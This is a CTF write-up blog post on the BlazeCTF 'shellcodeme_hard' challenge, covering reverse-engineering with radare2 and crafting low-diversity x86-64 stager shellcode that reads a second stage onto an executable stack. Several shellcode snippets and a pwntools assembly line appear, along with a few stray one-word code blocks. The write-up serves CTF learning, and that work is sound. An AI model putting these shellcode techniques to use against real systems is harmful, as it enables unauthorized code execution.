---
layout: post
title: "BlazeCTF writeup — shellcodeme_hard"
date: 2018-04-29 00:01:44 +0000
categories: blog
---

### BlazeCTF writeup — shellcodeme_hard

This is the harder version of the previous shellcodeme challenge. It doesn’t even provide any source code, so we have to “reverse-engineer” it first.

The good news is the binary is not too large to reverse-engineer. I spent some time to understand the disassembly code with the help of radare2, I noticed that:

```
strace
```

```
nop
```

Now it is clearly that the use of *context() API’s is actually for randomizing registers in shellcode execution context. Together with point 2), it seems we can’t solve this with read(STDIN) too.

On the bright side, there are a few registers which still contains fixed values: rsp points to a valid stack, rax is always 0, r10 is always 8, r11 is 0x246.

This looks like we can still somewhat to use read(STDIN) but we have to change the buffer address to stack. What is more insteresting, the stack is actually executable!!

So, this is my initial shellcode, without considering diversity:

```
mov rsi, rspmov rdx, r11mov rdi, raxsyscalljmp rsp
```

But its diversity can’t satisfy the binary. I spent quite some time on comparing and picking other possible instructions, the best I could come up with is:

```
0000000000000000 <.data>:   0: 5f                    pop    %rdi   1: 5f                    pop    %rdi   2: 48 0f 49 f4           cmovns %rsp,%rsi   6: 5f                    pop    %rdi   7: 5f                    pop    %rdi   8: 49 0f 49 d3           cmovns %r11,%rdx   c: 0f 05                 syscall    e: c3                    retq
```

whose diversity is 8, very close to 7!!! Why I pick that odd cmovns? Because its opcode contains 0x0f which is in syscall too!

```
cmovns
```

```
syscall
```

I can’t move it even further until David Weinman figured out I didn’t utilize the stack, he finally came up with:

```
asm("pop rdi; pop rdi; pop rdi; pop rdi; pop rsi; pop rdi;{} syscall; jmp rsi".format("pop rdx; "*53), arch="x86", bits=64)
```

Apparently I didn’t pop the stack hard enough until finding a suitable value for rdx! And of course repeating the same instruction doesn’t increase diversity. Although we don’t dig into why that value is there on stack, but at least it works!

What a tough challenge!